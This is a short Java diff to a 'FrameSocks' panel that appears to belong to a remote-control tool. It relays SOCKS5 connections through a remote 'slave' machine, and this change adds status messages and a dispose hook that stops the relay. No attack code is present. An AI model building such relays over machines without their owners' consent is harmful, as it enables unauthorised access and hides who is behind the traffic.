@@ -206,6 +206,8 @@ public class FrameSocks extends ClientPanel {
 				
 				slave.addToSendQueue(new PacketControl(socks5, auth, user, pass, incomingPort));
 
+				lbl.setText("Listening on port " + port);
+
 				new Thread(new Runnable() {
 					public void run() {
 						try {
@@ -232,6 +234,7 @@ public class FrameSocks extends ClientPanel {
 							incomingSocksConnection.close();
 						} catch (Exception ex) {						
 							ex.printStackTrace();
+							lbl.setText("Failed " + ex.getMessage());
 						}
 					}
 				}).start();
@@ -248,6 +251,12 @@ public class FrameSocks extends ClientPanel {
 			btnStart.setEnabled(true);
 		}
 	}
+
+	@Override
+	public void dispose() {
+        super.dispose();
+        slave.addToSendQueue(new PacketControl(false));
+    }
 
 	private void test() {
         try {
